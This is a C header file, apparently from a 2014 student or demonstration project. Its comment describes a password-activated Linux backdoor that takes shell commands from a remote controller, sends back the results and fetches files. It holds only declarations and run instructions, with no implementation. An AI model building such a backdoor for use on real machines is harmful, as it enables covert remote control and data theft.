/*---------------------------------------------------------------------------------------
--      Source File:            backdoor.c
--
--      Functions:              main()
--								void sendPasswordToBackdoor(void *, char*);
--								int sendCommands(int, char*);
--								unsigned int host_convert(char *);
--								unsigned short in_cksum(unsigned short *, int);
--								char * resolve_host (const char *);
--								char * GetIPAddress (void);
--								void usage (char **argv);
--
--
--      Date:                   October 6, 2014
--
--      Revisions:              (Date and Description)
--                                      
--      Designer:               Cole Rees and David Tran
--                              
--      Programmer:             Cole Rees and David Tran
--
--		This program illustrates the use of the TCP/IP protocol suite being used to create a backdoor 
-- 		on a Linux machine that will take command line commands from an external controller and then 
-- 		return the results to the controller. The backdoor will only respond to the controller that 
-- 		supplies it with the correct password.
--
--
--      To compile the application:
--                      
--            	make clean
--				make
-- 
--	To run the application:
--	
--		./controller -s <Source IP Address> -p <Source Port> -d <Destination IP Address> -q <Destination Port> -c <Command To Run>
--
---------------------------------------------------------------------------------------*/

#ifndef CONTROLLER_H
#define CONTROLLER_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/tcp.h> 	// TCP Header definitions
#include <netinet/udp.h>   	// UDP Header definitions
#include <netinet/ip.h>    	// IP Header definitions
#include <sys/types.h>
#include <unistd.h>
#include <netinet/if_ether.h> 
#include <pcap.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <errno.h>
#include "helperFunctions.h"
#include <limits.h>

#define SIZE_ETHERNET 14
#define COPTIONS		"?c:"
#define CMDLINE			"cmd"
#define GETFILE			"file"
#define PTYPE			"UDP"

void sendPasswordToBackdoor(AddrInfo *, char*, char*);
int sendCommands(int, char*);
unsigned int host_convert(char *);
unsigned short in_cksum(unsigned short *, int);
char * resolve_host (const char *);
char * GetIPAddress (void);
void usage (char **argv);
int waitForResponse(AddrInfo *addr_ptr);
int recieveFile(AddrInfo *addr_ptr);
void packetRecieved(u_char*, const struct pcap_pkthdr*, const u_char*);


#endif

